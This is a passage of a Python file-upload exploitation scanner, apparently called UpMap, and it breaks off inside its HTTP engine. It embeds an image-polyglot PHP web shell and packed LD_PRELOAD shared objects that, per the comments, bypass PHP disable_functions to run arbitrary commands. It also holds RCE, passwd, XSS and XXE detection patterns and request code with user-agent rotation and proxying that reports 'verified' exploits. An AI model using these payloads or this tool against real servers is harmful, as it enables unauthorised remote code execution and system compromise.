zKqpzMwdzKy8zKqnzKzZzMsCzNZ3zKr7zKryzMspzKyyzM26zMrZzM3jzL2UzM3ZzKtezK4rzMpxzK5+mopowNtZzPC4DP+4zP/KzP/wzQ/ZzPAwACkAuglWAPL5AG+YAM+RzQ+rzPEQ3RtczP2EDREV3REp3RHH3RAG3RGD3QG23RGv3Q/nzRJ/3+z/4s0B490Q+d0Ssd0NhAz2G8UUWA0hddDijtCDmN0+iADaRw0ZyA0kHtCD+t0zwN1I9AvsS5ywIACY8A1KTACVSN0zkd1FMt1UF90aTQ1Ty91VaN1UJ90Ue91UMN1I4w1KTw01LN1VNdDlmt1VzNCViN1We91iit02CNDWdd1Wet0+gw1HeN06TgCF+NDXBN2OjQ1VZN11Y901HWvEZVBIZt2Axg2ZxQ2Zp92ZftCJed2ZzNCQzAAIU92oaNDfkwrYdAB1gAAyaADJ4d22nN2bPt2Z0N2ppt2Z092qBt2rJt2bE92qYt3J3926Kt2wwg2sVt2Li92Zzt28tN29L+ndufXdnDLdy/bd22/dzDbduG/cW4lsH1hQtFwAAZcN7ofd7mjd4nsN4ZcAInkAHCnd7o7d7xjQx0/Ad/YAQNLd/qfd7wHd/0Xd/+/d7pvd7tXeD03d7uTd/mHd8MIOD+bd72PeAFTuH/7eD/HeHyjeEPPuDr3eASHuLvLeEHnuAA/uARXgTxVWiUR96UQAkZEOPoTeMyLuMznuM6HuM3zuP0LeNLbQRG4ASPMAs97uM5buMzjuM1buM87uNPfuRRTuNJft443uNJLuVHvuROruQ3vuTpHeVWLuU6XuNc3uVPXuZQHuUsHmIYNX9FsAmU4AKbIOcu4AIxjud4Xuf+m0Dncv7ndB7olFDng97nhj4Lj5AP+VDkfI7ng07nc27ngz7ndy7nk77nkH7nes7nPM7plU7pe+7pde7nhX7phc7now7olg7pp+7nft7nPE7qjU7oo67pqD7pfz7rkc7qtd7oc97muKaw6+IPcb4JRGDsmyAFREAEyn7syy4Fdc7szr7szM7n1Z7s0M7sLjAL3B7py27sxw7tyU7t4C4FzU7tzG7uyr7u0Z7u1J7t6/7t1Z7t5E7vyg7uyC7t1s7nzd7v0q7vx47s7a7v+X7uyY7v4w7wxm7u157tC1/n/c7nLG5AUjw/cGhwIGFzc2VydCgkX1BPU1RbIjAwIl0pPz7xGC8FzaANIQ/yGvIk//EcX/LmHvLWUPIe3y6/8fPzsPIkL/LaQPMhPw4i3/Egrw03X/I7b/JSsPMeL/LmfvNSwPFEP/Qqj/HjkPIwf/Ib//JFn/LWQPI1P/VE//Iz7/E93ww6n/RND/JQH/MvP/EhJuyyUATUQA3aEA3mYA7W8PbR0AzREL3XEQ10P/fjQA16Tw3W0PbWkA54n/dtHw1uH/h3//Ztz/h6bw1y//aQf/d4//bm0PfjkPeI3/Zy3wzWYPja0PbpEPiHb/dwrw2kH/h5b/ibP/hwr/mC7/PpYA6V7/eLv/mID/uSD/h3z/p6z/htH/78vH/3to/4Pu/3n1/4gO/6lA/4y8/7Tw0TH1+LmsFFoA1QACiwTw3QAAAAAOq//u7//vDv/jlnAOtP//F///gP//6w/+vvDy/gEQABAMC/XwUF/hKYUOFChf5oPHwTUcBECH+AUCBwIMFGCh0hFGiQoMKDDCUFZuCQYcOBCSkuXMgQ48CIDTMW7OgwQ+cMRRCc/BTohNBQbB9BSUKqRhGSkEiQUAhJIM2bCmjWmdMmzU9Ca9oUJPRnrUEBa+L8eRPoL6K+hFGxGbCZ0Ka4hOpkNmhQsOLStg0iqlRZ0F5HtwbQCnSXWLE/cY3nOigc+WpchgwBL1zXSQQpV7p8jf7dDIBCnwojM/QhGWLFihszdqyYsqMxgC4jxloDYMqIMWdOHJ11E9GJGS9enER0Zu9uAgJvDYV05yUxZD/T3/yYc+XPkFPbPr06d2Xfue0Answrf27UoEM73AvcAe1XUfoCsZGSl1+gvMThmv4vKYPXBoQvIc3cmQoHBQXCYTsHBfqDIXfwodCDyy48KaHkHBwiQgA8BEA9EQVyhkQAXrpAoBQF8kK3or6AUSAYwaHxhX++8AIEHXsDQDkfv/HgQCFh/GKo9gAozotPlrSxSYFeYKgLKQXqIkEr+cKyMwAaU6S123KLKcyYQiBToBASggGvX0BpgL5H3nRkIzkFSv4gIYr+UARLJABQZCK9/jzoEb305DPOBJCSxKI/f4EAIQB+gWTRRi2KRCNLJRFIErs2FUgdwTaNQZ1N1YlEzo3ohAETSmDcZJMXE/rrIFklVMwdxPTadC/A0PpkI70KAFagAhIic5xYGxsTuqYCKAcF4wAgAxUSphVHVWkwKCAlYpjgdhxV4lJHDRKfIvcyf8zN4LrKKruu3evMcUjdkzbIIKGnLpu33gwB0BcAFVZRZRVcB86VpD4AqFWxuDTTtWFYfvX1V4lpqWwiSukqKrIlEIsLgQncu2UCgR5JiORHGS0AoQxCAE2VXEaDudi4jh1NF15yKc1YnUOjYKTSdvYZCdldhhZoF4NxQfpYnpcWSARccnEv2VwKKii1I0FztuCARRYIFoFmQNcsdeP94Y0i4gVgandm0FigN9zWWe0Zgv4Z6ISG9lnntgF4GwARfhYIF6FzTmhpoI+WOnCkkXY76qB1JuTpqQV6YOitsU4cgAeuhjrnvQEAe2qtzxaa8njRPfqNZ1d/xB9/JOaX5QYUaoDnCmwX4ZhrUPsFXd9PakByfonLBt1soqYXgHOTLI5FdYlD1xris8lGoGyKu4Y47QUyAxtukuH9uOTGt8cZa85PznSFHvAnoeHg9T7yiMqGzpvkhM8Af1yS++Y5/5+RTgCfEhAAOw=="
)

# ── disable_functions LD_PRELOAD system.so (l3m0n / yangyangwithgnu) ─────────────
# Arch-specific shared object that reads the EVIL_CMDLINE env var and system()s it;
# the php_disable_func mail()/error_log vector writes it to disk + LD_PRELOADs it.
# Stored zlib+base64-packed → decoded to the hex string injected into the PHP body.
def _unpack_so_hex(b64: str) -> str:
    """Decode a zlib+base64-packed .so back to its hex string (for hex2bin() in the
    LD_PRELOAD payload). Returns '' if the packed blob is corrupt — then the matching
    32/64-bit LD_PRELOAD vector is simply a no-op rather than crashing startup."""
    try:
        return zlib.decompress(base64.b64decode(b64)).decode()
    except Exception:
        return ""


_SO_X64_HEX = _unpack_so_hex(
    "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"
)
# ── 32-bit system.so DISABLED ───────────────────────────────────────────────
# The packed 32-bit blob is corrupt (zlib checksum fails — 0 bytes recoverable),
# so the 32-bit LD_PRELOAD vector is turned off. "" makes it a harmless no-op;
# the 64-bit path (_SO_X64_HEX) is unaffected. To re-enable, repack a valid
# 32-bit system.so and restore:  _SO_X32_HEX = _unpack_so_hex(<blob>)
_SO_X32_HEX = ""
_SO_X32_DISABLED_BLOB = (   # corrupt — retained for reference only, NOT decoded
    "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"
)

# ── EICAR test string ──────────────────────────────────────────────────────────
EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

# ── Detect patterns ────────────────────────────────────────────────────────────
RCE_PATTERNS   = [r"uid=\d+", r"root:", r"www-data", r"windows", r"\bNT AUTHORITY\b",
                  r"InJeCtTeSt", r"UpMapProbe", r"(?:Linux|Darwin|FreeBSD) \S+ \d+"]
PASSWD_PATTERN = re.compile(r"[^:]{1,32}:[^:]{0,128}:\d{0,10}:\d{0,10}:[^:]{0,100}:[^:]{0,100}:[^\n]*")
XSS_PATTERNS   = [r"UpMapXSS\d+", r"alert\(1\)", r"<script>"]
XXE_PATTERNS   = [r"root:.*?/bin/", r"daemon:", r"nobody:"]

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 3 — STATE MANAGER
# ─────────────────────────────────────────────────────────────────────────────

class StateManager:
    def __init__(self, path: str):
        self.path = path
        self.data = {"completed": [], "findings": [], "timestamp": ""}
        # Reentrant: mark_done/add_finding mutate then call save() under the lock.
        self._lock = threading.RLock()

    def load(self):
        if self.path and os.path.isfile(self.path):
            with open(self.path) as f:
                self.data = json.load(f)
            info(f"Resumed from state: {self.path} ({len(self.data['completed'])} modules done)")
        return self

    def save(self):
        if not self.path:
            return
        with self._lock:
            self.data["timestamp"] = datetime.datetime.now().isoformat()
            with open(self.path, "w") as f:
                json.dump(self.data, f, indent=2)

    def mark_done(self, module: str):
        with self._lock:
            if module not in self.data["completed"]:
                self.data["completed"].append(module)
            self.save()

    def is_done(self, module: str) -> bool:
        with self._lock:
            return module in self.data["completed"]

    def add_finding(self, finding: dict):
        with self._lock:
            self.data["findings"].append(finding)
            self.save()

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 4 — OUTPUT MANAGER
# ─────────────────────────────────────────────────────────────────────────────

class OutputManager:
    # Columns emitted by the txt/csv/json report, in display order.
    REPORT_COLS = ["time", "module", "filename", "mime",
                   "magic_bytes", "payload", "url", "notes"]

    def __init__(self, path: str = None, fmt: str = None, success_regex: str = None):
        self.path   = path
        self.fmt    = self._resolve_fmt(path, fmt)
        self.success_regex = success_regex
        self.lock   = threading.Lock()
        self.total      = 0   # modules to run (set per target)
        self.done       = 0   # modules completed
        self.req_count  = 0   # requests sent (activity counter)
        self.last_label = ""
        self.finds  = []
        self.payload_label = "builtin"   # set to custom shell name(s) when --shell used

    @staticmethod
    def _resolve_fmt(path: str, fmt: str) -> str:
        """Pick the report format: explicit --format wins, else infer from the
        file extension, else default to json."""
        if fmt:
            return fmt
        if path:
            ext = os.path.splitext(path)[1].lower().lstrip(".")
            if ext in ("txt", "csv", "json"):
                return ext
        return "json"

    def set_total(self, n: int):
        # n = number of modules that will run. Progress % is driven by modules
        # COMPLETED (an exact number), not by a guess at how many requests each
        # module sends — so the bar and counter are always accurate and never
        # overshoot 100%. Requests are counted separately, for activity only.
        self.total      = n      # modules to run
        self.done       = 0      # modules completed
        self.req_count  = 0      # requests sent (display only)
        self.last_label = ""

    def tick(self, label: str = ""):
        """Called once per request sent — bumps the request counter and refreshes
        the activity label. Does NOT advance the percentage (modules do)."""
        with self.lock:
            self.req_count += 1
            self._render(label)

    def advance(self, label: str = ""):
        """Called once when a module finishes — advances the percentage."""
        with self.lock:
            self.done = min(self.done + 1, self.total)
            self._render(label)

    def _render(self, label: str = ""):
        if label:
            self.last_label = label
        pct    = min(int(self.done / max(self.total, 1) * 100), 100)
        filled = min(pct * 25 // 100, 25)               # 25 chars wide
        empty  = 25 - filled
        bar    = f"{G}{'━' * filled}{DG}{'╌' * empty}{RS}"
        ctr    = (f"{DG}[{RS}{W}{self.done}{DG}/{W}{self.total}{DG} mods · "
                  f"{RS}{W}{self.req_count}{DG} reqs]{RS}")
        pct_s  = f"{C}{BLD}{pct:3d}%{RS}"
        lbl    = f"{DG}{self.last_label[:40]:<40}{RS}"
        line   = f"\r  {bar} {pct_s} {ctr}  {lbl}"
        sys.stdout.write(line)
        sys.stdout.flush()

    def record(self, module: str, filename: str, mime: str,
               magic: bool, url: str, notes: str = "", response=None):
        entry = {
            "module": module, "filename": filename,
            "mime": mime, "magic_bytes": magic,
            "url": url, "notes": notes,
            "payload": self.payload_label,
            "time": datetime.datetime.now().strftime("%H:%M:%S"),
        }
        with self.lock:
            self.finds.append(entry)
            print()   # newline after progress bar
            rce_verified = notes and "Verified RCE" in notes
            if rce_verified:
                print(f"  {R}{BLD}{'▓' * 68}{RS}")
                print(f"  {R}{BLD}[ VERIFIED Exploit ]  {module}  {DG}|{R}{BLD}  "
                      f"{filename}  {DG}|{R}{BLD}  "
                      f"mime={mime}  "
                      f"magic={'yes' if magic else 'no'}  "
                      f"payload={self.payload_label}{RS}")
                print(f"  {R}{BLD}{'▓' * 68}{RS}")
            else:
                found(
                    f"{OR}{BLD}{module}{RS}  {DG}|{RS}  "
                    f"{W}{filename}{RS}  {DG}|{RS}  "
                    f"{DG}mime={RS}{Y}{mime}{RS}  "
                    f"{DG}magic={RS}{G if magic else R}{'yes' if magic else 'no'}{RS}  "
                    f"{DG}payload={RS}{C}{self.payload_label}{RS}"
                )
            if url:
                print(f"  {DG}  access >{RS}  {B}{url}{RS}")
            if response is not None:
                code = getattr(response, "status_code", "?")
                body = getattr(response, "text", "") or ""
                limit = 1024
                truncated = len(body) > limit
                display = body[:limit]
                size_lbl = (f"full {len(body)} bytes"
                            if not truncated
                            else f"first {limit} of {len(body)} bytes")
                print(f"  {DG}  response [{RS}{W}{code}{RS}{DG}] ({size_lbl}):{RS}")
                for line in display.splitlines():
                    hit = False
                    if self.success_regex and re.search(
                            self.success_regex, line, re.I):
                        hit = True
                    if filename and filename in line:
                        hit = True
                    if hit:
                        print(f"  {G}{BLD}{line}{RS}")
                    else:
                        print(f"  {DG}{line}{RS}")
                if truncated:
                    print(f"  {Y}  [... truncated at {limit} bytes ...]{RS}")
        return entry

    def summary(self):
        print("\n")
        n = len(self.finds)
        divider = f"  {C}{'═' * 64}{RS}"
        if n == 0:
            print(divider)
            print(f"  {DG}SCAN COMPLETE  —  {W}no vulnerabilities confirmed{RS}")
            print(divider)
        else:
            print(divider)
            print(f"  {M}{BLD}SCAN COMPLETE  —  {n} FINDING{'S' if n != 1 else ''} CONFIRMED{RS}")
            print(divider)
            for i, e in enumerate(self.finds, 1):
                ts  = f"{DG}[{e['time']}]{RS}"
                mod = f"{OR}{BLD}{e['module']:<26}{RS}"
                fn  = f"{W}{e['filename']}{RS}"
                print(f"  {G}{BLD}{i:>2}.{RS}  {ts}  {mod}  {fn}")
            print(divider)
        self.write_report()
        print()

    def write_report(self):
        """Write the findings report to --output in the chosen format
        (txt | csv | json). No-op when no output path was given."""
        if not self.path:
            return
        try:
            if self.fmt == "csv":
                with open(self.path, "w", newline="", encoding="utf-8") as f:
                    w = csv.writer(f)
                    w.writerow(self.REPORT_COLS)
                    for e in self.finds:
                        w.writerow([e.get(c, "") for c in self.REPORT_COLS])
            elif self.fmt == "txt":
                with open(self.path, "w", encoding="utf-8") as f:
                    f.write(f"UpMap v{__version__} — scan report\n")
                    f.write(f"Generated: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n")
                    f.write(f"Findings:  {len(self.finds)}\n")
                    f.write("=" * 64 + "\n")
                    for i, e in enumerate(self.finds, 1):
                        f.write(f"\n[{i}] {e['module']}  ({e['time']})\n")
                        f.write(f"    filename : {e['filename']}\n")
                        f.write(f"    mime     : {e['mime']}  (magic={e['magic_bytes']})\n")
                        f.write(f"    payload  : {e['payload']}\n")
                        if e.get("url"):
                            f.write(f"    access   : {e['url']}\n")
                        if e.get("notes"):
                            f.write(f"    notes    : {e['notes']}\n")
            else:  # json
                with open(self.path, "w", encoding="utf-8") as f:
                    json.dump(self.finds, f, indent=2)
        except OSError as e:
            err(f"Could not write report to {self.path}: {e}")
            return
        success(f"Report written: {self.path}  ({self.fmt}, {len(self.finds)} findings)")

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 5 — HTTP ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class HttpEngine:
    """Handles all HTTP: session, proxy, UA rotation, rate limiting, SSL fallback."""

    def __init__(self, opts):
        self.opts       = opts
        self.session    = requests.Session()
        self.session.verify = False
        self._lock      = threading.Lock()
        self._last_req  = 0.0
        self.protocol   = "https"
        # Set by UploadContext once the host-down circuit breaker trips. When set,
        # send() stops retrying and fails immediately so in-flight modules bail
        # instead of grinding through full backoff loops against a dead host.
        self.abort_event     = None
        # Set by the SIGINT handler on first Ctrl+C so sleeps and retry loops
        # bail immediately; separate from abort_event (host-down semantics differ).
        self.interrupt_event = None

        if opts.proxy:
            p = opts.proxy
            self.session.proxies = {"http": p, "https": p}
            self.session.trust_env = False

        if opts.cookies:
            for kv in opts.cookies.split(";"):
                kv = kv.strip()
                if "=" in kv:
                    k, v = kv.split("=", 1)
                    self.session.cookies[k.strip()] = v.strip()

        if opts.random_ua:
            self.session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        elif opts.user_agent:
            self.session.headers.update({"User-Agent": opts.user_agent})

    def _isleep(self, seconds: float):
        """Sleep for *seconds*, returning immediately if interrupt_event is set."""
        ev = self.interrupt_event
        if ev is not None:
            ev.wait(seconds)
        else:
            time.sleep(seconds)

    def _rate_limit(self):
        if self.opts.rate_limit > 0:
            with self._lock:
                delta = time.time() - self._last_req
                wait  = (self.opts.rate_limit / 1000.0) - delta
                if wait > 0:
                    ev = self.interrupt_event
                    if ev is not None:
                        ev.wait(wait)
                    else:
                        time.sleep(wait)
                self._last_req = time.time()

    def _backoff(self, attempt: int):
        """Exponential backoff with jitter: ~0.5s, 1s, 2s … capped at 8s."""
        self._isleep(min(0.5 * (2 ** attempt), 8.0) + random.uniform(0, 0.3))

    @staticmethod
    def _retry_after(resp) -> float:
        """Honor a Retry-After header (seconds form); cap so we never hang."""
        ra = resp.headers.get("Retry-After", "")
        try:
            return min(float(ra), 30.0)
        except (TypeError, ValueError):
            return 2.0

    def send(self, method: str, url: str, **kwargs) -> requests.Response:
        """Central request dispatcher: rate limiting, UA rotation, TLS fallback,
        retry-with-backoff on transient/connection errors, and 429/503 handling.
        Raises the last exception only after all retries are exhausted."""
        self._rate_limit()
        if self.opts.random_ua:
            kwargs.setdefault("headers", {})
            kwargs["headers"]["User-Agent"] = random.choice(USER_AGENTS)
        # Separate (connect, read) timeouts: cap the CONNECT phase so a dead host
        # that silently drops SYNs fails fast instead of hanging the full read
        # timeout, while still allowing slow-but-alive responses to complete.
        to = self.opts.timeout
        if isinstance(to, (int, float)):
            kwargs.setdefault("timeout", (min(to, 8), to))
        else:
            kwargs.setdefault("timeout", to)
        kwargs.setdefault("allow_redirects", self.opts.allow_redirects)
        kwargs["verify"] = False

        attempts  = max(1, getattr(self.opts, "retries", 3))
        tls_tried = False
        last_exc  = None
        for i in range(attempts):
            # Bail immediately on host-down OR user interrupt.
            if (self.abort_event is not None and self.abort_event.is_set()) or \
               (self.interrupt_event is not None and self.interrupt_event.is_set()):
                raise last_exc or ConnectionError("scan aborted")
            try:
                resp = self.session.request(method, url, **kwargs)
            except SSLError as e:
                # Crypto/TLS handshake failure → fall back to http once.
                last_exc = e
                if url.startswith("https://") and not tls_tried:
                    url, tls_tried = "http://" + url[len("https://"):], True
                    continue
                break
            except TooManyRedirects as e:
                last_exc = e
                break                                    # not transient — give up
            except ConnectionError as e:
                # Refused / DNS-fail / no-route: retrying immediately won't help and
                # just multiplies the wait. Fail now and let the host-down breaker
                # (3 strikes across sends) decide — don't burn N retries per send.
                last_exc = e
                break
            except TRANSIENT_ERRORS as e:
